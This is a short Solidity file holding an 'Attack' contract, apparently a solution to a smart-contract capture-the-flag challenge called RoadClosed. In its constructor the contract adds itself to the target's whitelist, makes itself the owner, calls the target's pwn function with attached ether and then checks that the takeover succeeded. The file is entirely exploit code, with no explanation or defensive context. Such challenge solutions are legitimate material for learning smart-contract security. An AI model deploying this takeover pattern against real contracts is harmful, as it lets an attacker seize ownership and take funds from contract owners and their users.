// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.7;

interface IRoadClosed {
    function addToWhitelist(address addr) external;

    function changeOwner(address addr) external;

    function pwn(address addr) external payable;

    function isHacked() external view returns (bool);

    function isOwner() external view returns (bool);
}

error Attack__pwnFailed();
error Attack__IsNotHacked();
error Attack__IsNotTheOwner();

contract Attack {
    constructor(address roadClosedAddress) payable {
        address newOwner = address(this);
        IRoadClosed(roadClosedAddress).addToWhitelist(newOwner);
        IRoadClosed(roadClosedAddress).changeOwner(newOwner);
        bytes memory payload = abi.encodeWithSignature(
            "pwn(address)",
            newOwner
        );
        (bool success, ) = address(IRoadClosed(roadClosedAddress)).call{
            value: msg.value
        }(payload);

        if (!success) revert Attack__pwnFailed();

        if (!IRoadClosed(roadClosedAddress).isHacked())
            revert Attack__IsNotHacked();

        if (!IRoadClosed(roadClosedAddress).isOwner())
            revert Attack__IsNotTheOwner();
    }
}
